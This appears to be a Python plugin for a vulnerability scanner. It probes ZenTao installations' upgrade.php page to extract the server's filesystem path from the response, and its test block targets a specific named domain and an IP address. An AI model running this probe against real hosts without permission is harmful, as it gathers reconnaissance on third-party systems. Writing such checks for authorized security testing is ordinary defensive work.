#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
    if service == "zentao":
        return True, arg

def audit(arg):
    poc = arg + 'upgrade.php'
    raw = '''GET /upgrade.php HTTP/1.1
Host: 101.71.22.77:8009
Proxy-Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
X_REQUESTED_WITH: aaa
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
DNT: 1

'''
    code, head, res, errcode, _ = curl.curl2(poc,raw=raw)
    if code==200 and '打开命令行' in res:
        path = res[res.find('删掉')+7:res.find('这个文件')-4]
        security_info(arg+"  zentao path info: "+path)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zentao', 'http://zentao.ichsy.com/')[1])
    audit(assign('zentao', 'http://101.71.22.77:8009/')[1])